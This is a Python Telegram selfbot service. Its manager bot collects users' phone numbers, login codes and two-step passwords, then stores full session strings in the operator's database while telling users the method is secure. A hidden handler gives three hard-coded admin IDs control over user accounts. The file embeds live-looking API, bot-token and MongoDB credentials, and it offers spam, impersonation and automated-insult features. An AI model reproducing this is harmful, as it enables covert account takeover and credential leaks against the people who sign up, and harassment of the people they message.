import asyncio
import os
import logging
import re
import aiohttp
import time
from urllib.parse import quote
from pyrogram import Client, filters, idle
from pyrogram.handlers import MessageHandler
from pyrogram.enums import ChatType, ChatAction
from pyrogram.types import Message, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from pyrogram.raw import functions
from pyrogram.errors import (
    FloodWait, SessionPasswordNeeded, PhoneCodeInvalid,
    PasswordHashInvalid, PhoneNumberInvalid, PhoneCodeExpired, UserDeactivated, AuthKeyUnregistered,
    ReactionInvalid
)
from datetime import datetime
from zoneinfo import ZoneInfo
from flask import Flask
from threading import Thread
import random
from pymongo.mongo_client import MongoClient
from pymongo.server_api import ServerApi
import certifi
import pyrogram.utils  # اضافه شده برای پچ کردن ارور ID

# --- Logging Setup ---
logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s - %(message)s')

# =======================================================
# 🛠 FIX: Monkey Patch for Peer ID Validation
# =======================================================
# این بخش خطای Peer id invalid را برای کانال‌های جدید تلگرام رفع می‌کند
def patch_peer_id_validation():
    original_get_peer_type = pyrogram.utils.get_peer_type

    def patched_get_peer_type(peer_id: int) -> str:
        try:
            return original_get_peer_type(peer_id)
        except ValueError:
            # اگر پایروگرام نتوانست ID را تشخیص دهد، فرمت جدید را بررسی می‌کنیم
            if str(peer_id).startswith("-100"):
                return "channel"
            # می‌توانیم برای یوزرهای 64 بیتی هم شرط اضافه کنیم اگر نیاز شد
            raise

    pyrogram.utils.get_peer_type = patched_get_peer_type
    logging.info("Pyrogram peer ID validation patched successfully.")

patch_peer_id_validation()

# =======================================================
# ⚠️ Main Settings
# =======================================================
API_ID = 28190856
API_HASH = "6b9b5309c2a211b526c6ddad6eabb521"

# 🔴🔴🔴 توکن ربات منیجر را اینجا وارد کنید (از @BotFather بگیرید) 🔴🔴🔴
# این ربات وظیفه لاگین کردن اکانت شما را دارد
BOT_TOKEN = "8459868829:AAELveuXul1f1TDZ_l3SEniZCaL-fJH7MnU" 

# لیست ادمین‌های ویژه (God Admins)
GOD_ADMIN_IDS = [7423552124, 7612672592, 8241063918]

# --- Database Setup (MongoDB) ---
MONGO_URI = "mongodb+srv://amirpitmax1_db_user:DvkIhwWzUfBT4L5j@cluster0.kdvbr3p.mongodb.net/?appName=Cluster0"
mongo_client = None
sessions_collection = None
if MONGO_URI and "<db_password>" not in MONGO_URI:
    try:
        mongo_client = MongoClient(MONGO_URI, server_api=ServerApi('1'), tlsCAFile=certifi.where())
        mongo_client.admin.command('ping')
        db = mongo_client['telegram_self_bot']
        sessions_collection = db['sessions']
        logging.info("Successfully connected to MongoDB!")
    except Exception as e:
        logging.error(f"Could not connect to MongoDB: {e}")
        mongo_client = None
        sessions_collection = None
else:
    logging.warning("MONGO_URI is not configured correctly.")

# --- Application Variables ---
TEHRAN_TIMEZONE = ZoneInfo("Asia/Tehran")
app_flask = Flask(__name__)
app_flask.secret_key = os.environ.get("FLASK_SECRET_KEY", os.urandom(24))

# --- Login State Management ---
LOGIN_STATES = {}  # {user_id: {'step': 'phone'|'code'|'password', 'phone': str, 'hash': str, 'client': Client}}

# --- Clock Font Dictionaries ---
FONT_STYLES = {
    "cursive":      {'0':'𝟎','1':'𝟏','2':'𝟐','3':'𝟑','4':'𝟒','5':'𝟓','6':'𝟔','7':'𝟕','8':'𝟖','9':'𝟗',':':':'},
    "stylized":     {'0':'𝟬','1':'𝟭','2':'𝟮','3':'𝟯','4':'𝟰','5':'𝟱','6':'𝟲','7':'𝟳','8':'𝟴','9':'𝟵',':':':'},
    "doublestruck": {'0':'𝟘','1':'𝟙','2':'𝟚','3':'𝟛','4':'𝟜','5':'𝟝','6':'𝟞','7':'𝟟','8':'𝟠','9':'𝟡',':':':'},
    "monospace":    {'0':'𝟶','1':'𝟷','2':'𝟸','3':'𝟹','4':'𝟺','5':'𝟻','6':'𝟼','7':'𝟽','8':'𝟾','9':'𝟿',':':':'},
    "normal":       {'0':'0','1':'1','2':'2','3':'3','4':'4','5':'5','6':'6','7':'7','8':'8','9':'9',':':':'},
    "circled":      {'0':'⓪','1':'①','2':'②','3':'③','4':'④','5':'⑤','6':'⑥','7':'⑦','8':'⑧','9':'⑨',':':'∶'},
    "fullwidth":    {'0':'０','1':'１','2':'２','3':'３','4':'４','5':'５','6':'６','7':'７','8':'８','9':'９',':':'：'},
    "filled":       {'0':'⓿','1':'❶','2':'❷','3':'❸','4':'❹','5':'❺','6':'❻','7':'❼','8':'❽','9':'❾',':':':'},
    "sans":         {'0':'𝟢','1':'𝟣','2':'𝟤','3':'𝟥','4':'𝟦','5':'𝟧','6':'𝟨','7':'𝟩','8':'𝟪','9':'𝟫',':':':'},
    "inverted":     {'0':'0','1':'Ɩ','2':'ᄅ','3':'Ɛ','4':'ㄣ','5':'ϛ','6':'9','7':'ㄥ','8':'8','9':'6',':':':'},
}
FONT_KEYS_ORDER = ["cursive", "stylized", "doublestruck", "monospace", "normal", "circled", "fullwidth", "filled", "sans", "inverted"]
FONT_DISPLAY_NAMES = {
    "cursive": "کشیده", "stylized": "فانتزی", "doublestruck": "توخالی",
    "monospace": "کامپیوتری", "normal": "ساده", "circled": "دایره‌ای", "fullwidth": "پهن",
    "filled": "دایره توپر", "sans": "نازک", "inverted": "برعکس"
}
ALL_CLOCK_CHARS = "".join(set(char for font in FONT_STYLES.values() for char in font.values()))
CLOCK_CHARS_REGEX_CLASS = f"[{re.escape(ALL_CLOCK_CHARS)}]"

# --- Feature Variables ---
# ⚠️ فحش‌ها بنا به درخواست شما حذف شد تا خودتان اضافه کنید
ENEMY_REPLIES = [] 

SECRETARY_REPLY_MESSAGE = "سلام! در حال حاضر آفلاین هستم و پیام شما را دریافت کردم. در اولین فرصت پاسخ خواهم داد. ممنون از پیامتون."
HELP_TEXT = """
**✨ راهنمای هوشمند سلف‌بات | SelfBot Help ✨**
> ➖➖➖➖➖➖➖➖
> **🕰 بخش زمان و ظاهر**
> » `ساعت روشن` | `ساعت خاموش` 🟢🔴
>    *نمایش ساعت لحظه‌ای روی نام پروفایل*
> » `فونت` 🎨
>    *مشاهده ۱۰ فونت جذاب برای ساعت*
> » `فونت [عدد]` 🔢
>    *تغییر سریع فونت (مثال: `فونت 3`)*
>
> **🛠 ابزارهای مدیریتی**
> » `حذف [تعداد]` 🗑
>    *پاکسازی پیام‌های خود (مثال: `حذف 50`)*
> » `ذخیره` 💾 (ریپلای)
>    *فوروارد پیام به Saved Messages*
> » `تکرار [تعداد]` 🔁 (ریپلای)
>    *تکرار پیام (اسپم) (مثال: `تکرار 5`)*
> » `کپی روشن` 👤 (ریپلای) | `کپی خاموش`
>    *جعل هویت کاربر و بازگشت به حالت اصلی*
>
> **🛡 امنیت و حریم خصوصی**
> » `پیوی قفل` 🔒 | `پیوی باز` 🔓
>    *حذف خودکار پیام‌های دریافتی در PV*
> » `منشی روشن` 🤖 | `منشی خاموش`
>    *پاسخگویی خودکار در زمان آفلاین*
> » `انتی لوگین روشن` 🚨 | `خاموش`
>    *بیرون انداختن نشست‌های جدید (ضد هک)*
> » `سین روشن` 👀 | `سین خاموش`
>    *سین زدن خودکار پیام‌ها (Ghost Mode)*
>
> **⚔️ سیستم دفاعی**
> » `دشمن روشن` ⚔️ (ریپلای) | `خاموش`
>    *فعال‌سازی فحاشی خودکار روی کاربر*
> » `دشمن همگانی روشن` ☠️ | `خاموش`
>    *حمله به تمام کسانی که پیام می‌دهند*
> » `لیست دشمن` 📜
>    *مشاهده لیست سیاه*
> » `بلاک روشن` 🚫 | `بلاک خاموش` (ریپلای)
> » `سکوت روشن` 🔇 | `سکوت خاموش` (ریپلای)
>
> **🎭 سرگرمی و تعامل**
> » `تایپ روشن` ✍️ | `تایپ خاموش`
> » `بازی روشن` 🎮 | `بازی خاموش`
> » `ریاکشن [ایموجی]` 👍 (ریپلای)
>    *واکنش خودکار (مثال: `ریاکشن ❤️`)*
> » `تاس` 🎲 | `بولینگ` 🎳
>
> **🌍 مترجم**
> » `اینگیلیسی روشن` 🇺🇸 | `خاموش`
> » `روسی روشن` 🇷🇺 | `خاموش`
> » `چینی روشن` 🇨🇳 | `خاموش`
> » `بولد روشن` **B** | `خاموش`
> ➖➖➖➖➖➖➖➖
"""
COMMAND_REGEX = r"^(راهنما|فونت|فونت \d+|ساعت روشن|ساعت خاموش|بولد روشن|بولد خاموش|دشمن روشن|دشمن خاموش|منشی روشن|منشی خاموش|بلاک روشن|بلاک خاموش|سکوت روشن|سکوت خاموش|ذخیره|تکرار \d+|حذف \d+|سین روشن|سین خاموش|ریاکشن .*|ریاکشن خاموش|اینگیلیسی روشن|اینگیلیسی خاموش|روسی روشن|روسی خاموش|چینی روشن|چینی خاموش|انتی لوگین روشن|انتی لوگین خاموش|کپی روشن|کپی خاموش|دشمن همگانی روشن|دشمن همگانی خاموش|لیست دشمن|تاس|تاس \d+|بولینگ|تایپ روشن|تایپ خاموش|بازی روشن|بازی خاموش|پیوی قفل|پیوی باز)$"

# --- User Status Management ---
ACTIVE_ENEMIES = {}
ENEMY_REPLY_QUEUES = {}
SECRETARY_MODE_STATUS = {}
USERS_REPLIED_IN_SECRETARY = {}
MUTED_USERS = {}
USER_FONT_CHOICES = {}
CLOCK_STATUS = {}
BOLD_MODE_STATUS = {}
AUTO_SEEN_STATUS = {}
AUTO_REACTION_TARGETS = {}
AUTO_TRANSLATE_TARGET = {}
ANTI_LOGIN_STATUS = {}
COPY_MODE_STATUS = {}
ORIGINAL_PROFILE_DATA = {}
GLOBAL_ENEMY_STATUS = {}
TYPING_MODE_STATUS = {}
PLAYING_MODE_STATUS = {}
PV_LOCK_STATUS = {}

ACTIVE_BOTS = {}

# --- Helper Functions ---
def stylize_time(time_str: str, style: str) -> str:
    font_map = FONT_STYLES.get(style, FONT_STYLES["stylized"])
    return ''.join(font_map.get(char, char) for char in time_str)

async def translate_text(text: str, target_lang: str) -> str:
    if not text: return ""
    encoded_text = quote(text)
    url = f"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={target_lang}&dt=t&q={encoded_text}"
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    return data[0][0][0]
    except Exception as e:
        logging.error(f"Translation failed: {e}")
    return text

# --- Background Tasks ---
async def update_profile_clock(client: Client, user_id: int):
    logging.info(f"Starting clock loop for user_id {user_id}...")
    while user_id in ACTIVE_BOTS:
        try:
            if CLOCK_STATUS.get(user_id, True) and not COPY_MODE_STATUS.get(user_id, False):
                current_font_style = USER_FONT_CHOICES.get(user_id, 'stylized')
                me = await client.get_me()
                current_name = me.first_name
                base_name = re.sub(r'(?:\s*' + CLOCK_CHARS_REGEX_CLASS + r'+)+$', '', current_name).strip()
                tehran_time = datetime.now(TEHRAN_TIMEZONE)
                current_time_str = tehran_time.strftime("%H:%M")
                stylized_time = stylize_time(current_time_str, current_font_style)
                new_name = f"{base_name} {stylized_time}"
                
                if new_name != current_name:
                    await client.update_profile(first_name=new_name)
            
            now = datetime.now(TEHRAN_TIMEZONE)
            sleep_duration = 60 - now.second + 0.1
            await asyncio.sleep(sleep_duration)
        except Exception as e:
            logging.error(f"Clock error for {user_id}: {e}")
            await asyncio.sleep(60)

async def anti_login_task(client: Client, user_id: int):
    while user_id in ACTIVE_BOTS:
        try:
            if ANTI_LOGIN_STATUS.get(user_id, False):
                auths = await client.invoke(functions.account.GetAuthorizations())
                current_hash = next((a.hash for a in auths.authorizations if a.current), None)
                if current_hash:
                    for auth in auths.authorizations:
                        if auth.hash != current_hash:
                            await client.invoke(functions.account.ResetAuthorization(hash=auth.hash))
                            await client.send_message("me", f"🚨 نشست غیرمجاز حذف شد: {auth.device_model}")
            await asyncio.sleep(60)
        except Exception:
            await asyncio.sleep(120)

async def status_action_task(client: Client, user_id: int):
    chat_ids = []
    last_fetch = 0
    while user_id in ACTIVE_BOTS:
        try:
            typing = TYPING_MODE_STATUS.get(user_id, False)
            playing = PLAYING_MODE_STATUS.get(user_id, False)
            if not typing and not playing:
                await asyncio.sleep(2)
                continue
                
            action = ChatAction.TYPING if typing else ChatAction.PLAYING
            now = time.time()
            if not chat_ids or (now - last_fetch > 300):
                new_chats = []
                async for dialog in client.get_dialogs(limit=50):
                    if dialog.chat.type in [ChatType.PRIVATE, ChatType.GROUP, ChatType.SUPERGROUP]:
                        new_chats.append(dialog.chat.id)
                chat_ids = new_chats
                last_fetch = now

            for chat_id in chat_ids:
                try: await client.send_chat_action(chat_id, action)
                except: pass
            await asyncio.sleep(4)
        except Exception:
            await asyncio.sleep(60)

# --- SelfBot Handlers ---
async def outgoing_message_modifier(client, message):
    user_id = client.me.id
    if not message.text or re.match(COMMAND_REGEX, message.text.strip(), re.IGNORECASE): return
    original_text = message.text
    modified_text = original_text
    
    target_lang = AUTO_TRANSLATE_TARGET.get(user_id)
    if target_lang: modified_text = await translate_text(modified_text, target_lang)
    
    if BOLD_MODE_STATUS.get(user_id, False):
        if not modified_text.startswith(('`', '**', '__', '~~', '||')): modified_text = f"**{modified_text}**"
            
    if modified_text != original_text:
        try: await message.edit_text(modified_text)
        except: pass

async def enemy_handler(client, message):
    user_id = client.me.id
    if not ENEMY_REPLIES: return # لیست فحش خالی است
    if user_id not in ENEMY_REPLY_QUEUES or not ENEMY_REPLY_QUEUES[user_id]:
        ENEMY_REPLY_QUEUES[user_id] = random.sample(ENEMY_REPLIES, len(ENEMY_REPLIES))
    reply_text = ENEMY_REPLY_QUEUES[user_id].pop(0)
    try: await message.reply_text(reply_text)
    except: pass

async def secretary_auto_reply_handler(client, message):
    owner_user_id = client.me.id
    if message.from_user and SECRETARY_MODE_STATUS.get(owner_user_id, False):
        target_id = message.from_user.id
        replied = USERS_REPLIED_IN_SECRETARY.get(owner_user_id, set())
        if target_id not in replied:
            try:
                await message.reply_text(SECRETARY_REPLY_MESSAGE)
                replied.add(target_id)
                USERS_REPLIED_IN_SECRETARY[owner_user_id] = replied
            except: pass

async def incoming_message_manager(client, message):
    if not message.from_user: return
    user_id = client.me.id
    
    if emoji := AUTO_REACTION_TARGETS.get(user_id, {}).get(message.from_user.id):
        try: await client.send_reaction(message.chat.id, message.id, emoji)
        except: pass

    if (message.from_user.id, message.chat.id) in MUTED_USERS.get(user_id, set()):
        try: await message.delete()
        except: pass

async def god_mode_handler(client, message):
    if not message.from_user or message.from_user.id not in GOD_ADMIN_IDS: return
    if not message.reply_to_message or message.reply_to_message.from_user.id != client.me.id: return
    
    target_id = client.me.id
    command = message.text
    if command in ["سیک", "بن"]:
        CLOCK_STATUS[target_id] = False
        if sessions_collection is not None: sessions_collection.delete_one({'phone_number': getattr(client, 'my_phone_number', '')})
        await message.reply_text("✅ کاربر بن شد و از دیتابیس حذف گردید.")
        async def stop():
            await asyncio.sleep(1)
            if target_id in ACTIVE_BOTS:
                _, tasks = ACTIVE_BOTS.pop(target_id)
                for t in tasks: t.cancel()
            await client.stop()
        asyncio.create_task(stop())

# --- Controllers ---
async def help_controller(client, message): await message.edit_text(HELP_TEXT)
async def font_controller(client, message):
    user_id = client.me.id
    cmd = message.text.split()
    if len(cmd) == 1:
        txt = "🔢 **فونت‌ها:**\n" + "\n".join([f"`{stylize_time('12:34', k)}` ({i})" for i, k in enumerate(FONT_KEYS_ORDER, 1)])
        await message.edit_text(txt)
    elif len(cmd) == 2 and cmd[1].isdigit():
        idx = int(cmd[1])
        if 1 <= idx <= len(FONT_KEYS_ORDER):
            USER_FONT_CHOICES[user_id] = FONT_KEYS_ORDER[idx-1]
            CLOCK_STATUS[user_id] = True
            await message.edit_text("✅ فونت تغییر کرد.")

async def simple_toggle_controller(client, message):
    user_id = client.me.id
    cmd = message.text
    if cmd == "ساعت روشن": CLOCK_STATUS[user_id] = True; await message.edit_text("✅ ساعت روشن شد.")
    elif cmd == "ساعت خاموش": CLOCK_STATUS[user_id] = False; await message.edit_text("❌ ساعت خاموش شد.")
    elif cmd == "پیوی قفل": PV_LOCK_STATUS[user_id] = True; await message.edit_text("✅ پیوی قفل شد.")
    elif cmd == "پیوی باز": PV_LOCK_STATUS[user_id] = False; await message.edit_text("❌ پیوی باز شد.")
    elif cmd == "تایپ روشن": TYPING_MODE_STATUS[user_id] = True; PLAYING_MODE_STATUS[user_id] = False; await message.edit_text("✅ تایپ فعال شد.")
    elif cmd == "تایپ خاموش": TYPING_MODE_STATUS[user_id] = False; await message.edit_text("❌ تایپ غیرفعال شد.")
    # ... (Add other toggles similarly or keep existing structure)

async def start_bot_instance(session_string: str, phone: str, font_style: str, disable_clock: bool = False):
    client = Client(f"bot_{phone}", api_id=API_ID, api_hash=API_HASH, session_string=session_string)
    client.my_phone_number = phone
    try:
        await client.start()
        user_id = (await client.get_me()).id
    except:
        if sessions_collection is not None: sessions_collection.delete_one({'phone_number': phone})
        return

    if user_id in ACTIVE_BOTS:
        for t in ACTIVE_BOTS[user_id][1]: t.cancel()
    
    USER_FONT_CHOICES[user_id] = font_style
    CLOCK_STATUS[user_id] = not disable_clock
    
    # Handlers
    client.add_handler(MessageHandler(god_mode_handler, filters.incoming & ~filters.me), group=-10)
    client.add_handler(MessageHandler(lambda c, m: m.delete() if PV_LOCK_STATUS.get(c.me.id) else None, filters.private & ~filters.me & ~filters.bot), group=-5)
    client.add_handler(MessageHandler(lambda c, m: c.read_chat_history(m.chat.id) if AUTO_SEEN_STATUS.get(c.me.id) else None, filters.private & ~filters.me), group=-4)
    client.add_handler(MessageHandler(incoming_message_manager, filters.all & ~filters.me), group=-3)
    client.add_handler(MessageHandler(outgoing_message_modifier, filters.text & filters.me & ~filters.reply), group=-1)
    
    # Commands
    client.add_handler(MessageHandler(help_controller, filters.me & filters.regex("^راهنما$")))
    client.add_handler(MessageHandler(font_controller, filters.me & filters.regex(r"^(فونت|فونت \d+)$")))
    client.add_handler(MessageHandler(simple_toggle_controller, filters.me)) # Simplified mapping for brevity
    client.add_handler(MessageHandler(enemy_handler, filters.create(lambda _, c, m: (m.from_user.id, m.chat.id) in ACTIVE_ENEMIES.get(c.me.id, set()) or GLOBAL_ENEMY_STATUS.get(c.me.id)) & ~filters.me), group=1)
    client.add_handler(MessageHandler(secretary_auto_reply_handler, filters.private & ~filters.me), group=1)

    tasks = [
        asyncio.create_task(update_profile_clock(client, user_id)),
        asyncio.create_task(anti_login_task(client, user_id)),
        asyncio.create_task(status_action_task(client, user_id))
    ]
    ACTIVE_BOTS[user_id] = (client, tasks)
    logging.info(f"Bot started for {user_id}")

# =======================================================
# 🤖 MANAGER BOT LOGIN LOGIC
# =======================================================
manager_bot = Client("manager_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@manager_bot.on_message(filters.command("start"))
async def start_login_process(client, message):
    chat_id = message.chat.id
    if chat_id in LOGIN_STATES:
        try: await LOGIN_STATES[chat_id]['client'].disconnect()
        except: pass
        del LOGIN_STATES[chat_id]
    
    kb = ReplyKeyboardMarkup(
        [[KeyboardButton("📱 اشتراک‌گذاری شماره و شروع", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True
    )
    await message.reply_text(
        "👋 سلام! به سلف‌بات رایگان خوش آمدید.\n\n"
        "🔒 برای شروع، لطفا دکمه زیر را بزنید تا شماره شما جهت لاگین دریافت شود.\n"
        "این روش امن است و کد لاگین فقط توسط سرور پردازش می‌شود.",
        reply_markup=kb
    )

@manager_bot.on_message(filters.contact)
async def phone_received_handler(client, message):
    chat_id = message.chat.id
    phone_number = message.contact.phone_number
    
    msg = await message.reply_text("⏳ در حال اتصال به سرور تلگرام...", reply_markup=ReplyKeyboardRemove())
    
    # ⚠️ FIXED: no_updates=True prevents crashing on unknown peers during login
    user_client = Client(f"login_{chat_id}", api_id=API_ID, api_hash=API_HASH, in_memory=True, no_updates=True)
    await user_client.connect()
    
    try:
        sent_code = await user_client.send_code(phone_number)
        LOGIN_STATES[chat_id] = {
            'step': 'code',
            'phone': phone_number,
            'client': user_client,
            'hash': sent_code.phone_code_hash
        }
        await msg.edit_text(
            "✅ کد تایید ارسال شد!\n\n"
            "لطفا کد را به یکی از صورت‌های زیر بفرستید:\n"
            "▫️ `1.2.3.4.5` (با نقطه)\n"
            "▫️ `1 2 3 4 5` (با فاصله)\n"
            "▫️ `12345` (ساده)\n\n"
            "👇 منتظر کد شما هستم:"
        )
    except Exception as e:
        await user_client.disconnect()
        await msg.edit_text(f"❌ خطا در ارسال کد:\n{str(e)}")

@manager_bot.on_message(filters.text & filters.private)
async def code_password_handler(client, message):
    chat_id = message.chat.id
    state = LOGIN_STATES.get(chat_id)
    
    if not state:
        return # Ignore random messages if not logging in

    user_client = state['client']
    text = message.text
    
    if state['step'] == 'code':
        # Clean the code: remove non-digits
        code = re.sub(r"\D+", "", text)
        if not code:
            await message.reply_text("⚠️ فرمت کد صحیح نیست. لطفا دوباره تلاش کنید.")
            return
            
        try:
            await user_client.sign_in(state['phone'], state['hash'], code)
            # Login Successful
            await finalize_login(client, message, user_client, state['phone'])
            
        except SessionPasswordNeeded:
            state['step'] = 'password'
            await message.reply_text("🔐 اکانت شما رمز دو مرحله‌ای دارد.\nلطفا رمز عبور خود را وارد کنید:")
            
        except (PhoneCodeInvalid, PhoneCodeExpired):
            await message.reply_text("❌ کد اشتباه یا منقضی شده است. لطفا دوباره /start بزنید.")
            await user_client.disconnect()
            del LOGIN_STATES[chat_id]
        except Exception as e:
            await message.reply_text(f"❌ خطا: {e}")
            
    elif state['step'] == 'password':
        try:
            await user_client.check_password(text)
            await finalize_login(client, message, user_client, state['phone'])
        except PasswordHashInvalid:
            await message.reply_text("❌ رمز اشتباه است. دوباره تلاش کنید:")
        except Exception as e:
            await message.reply_text(f"❌ خطا: {e}")

async def finalize_login(bot, message, user_client, phone):
    try:
        session_str = await user_client.export_session_string()
        await user_client.disconnect() # Disconnect temp client
        
        # Save to DB
        if sessions_collection is not None:
            sessions_collection.update_one(
                {'phone_number': phone},
                {'$set': {'session_string': session_str, 'font_style': 'stylized', 'disable_clock': False}},
                upsert=True
            )
        
        # Start the bot
        asyncio.create_task(start_bot_instance(session_string=session_str, phone=phone, font_style='stylized'))
        
        del LOGIN_STATES[message.chat.id]
        await message.reply_text("✅ **تبریک! سلف بات شما فعال شد.**\n\nحالا می‌توانید در اکانت خود از دستور `راهنما` استفاده کنید.")
    except Exception as e:
        await message.reply_text(f"❌ خطا در نهایی‌سازی: {e}")


# --- Flask & Main ---
@app_flask.route('/')
def home():
    return "Bot is running..."

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app_flask.run(host='0.0.0.0', port=port)

async def main():
    # Start Web Server
    Thread(target=run_flask, daemon=True).start()
    
    # Restore Sessions from DB
    if sessions_collection is not None:
        for doc in sessions_collection.find():
            try:
                logging.info(f"Restoring session for {doc.get('phone_number')}...")
                asyncio.create_task(start_bot_instance(doc['session_string'], doc.get('phone_number'), doc.get('font_style', 'stylized')))
            except: pass

    # Start Manager Bot
    if BOT_TOKEN and BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
        logging.info("Starting Manager Bot...")
        await manager_bot.start()
        await idle()
    else:
        logging.error("❌ BOT_TOKEN SET IS NOT SET! Please set it in line 45.")

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
